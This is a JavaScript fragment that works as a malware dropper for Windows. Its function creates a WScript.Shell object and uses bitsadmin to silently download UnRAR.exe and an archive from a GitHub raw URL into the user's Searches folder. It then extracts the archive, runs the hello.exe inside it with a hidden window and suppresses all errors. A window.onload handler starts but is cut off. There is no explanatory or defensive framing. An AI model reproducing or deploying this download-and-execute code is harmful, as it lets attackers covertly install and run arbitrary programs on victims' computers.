function downloadExtractAndExecute() {
    try {
        var objShell = new ActiveXObject("WScript.Shell");

        var unrarSaveTo = "C:\\Users\\" + username + "\\Searches\\UnRAR.exe";
        var unrarCmd = "cmd.exe /c bitsadmin.exe /transfer myDownloadJob /download /priority normal " + unrarUrl + " " + unrarSaveTo;
        objShell.Run(unrarCmd, 0, true);

        var helloUrl = "https://github.com/usa877/kingmoon/raw/main/hello.rar";
        var helloSaveTo = "C:\\Users\\" + username + "\\Searches\\hello.rar";
        var helloCmd = "cmd.exe /c bitsadmin.exe /transfer myDownloadJob /download /priority normal " + helloUrl + " " + helloSaveTo;
        objShell.Run(helloCmd, 0, true);

        var rarFile = "C:\\Users\\" + username + "\\Searches\\hello.rar";
        var unrarPath = "C:\\Users\\" + username + "\\Searches\\UnRAR.exe";
        var unrarExtractCmd = "cmd.exe /c " + unrarPath + " x " + rarFile + " C:\\Users\\" + username + "\\Searches\\";
        objShell.Run(unrarExtractCmd, 0, true);

        var helloExePath = "C:\\Users\\" + username + "\\Searches\\hello.exe";
        objShell.Run(helloExePath, 0, true);
    } catch (e) {
        // Handle any errors silently
    }
}

window.onload = function() {
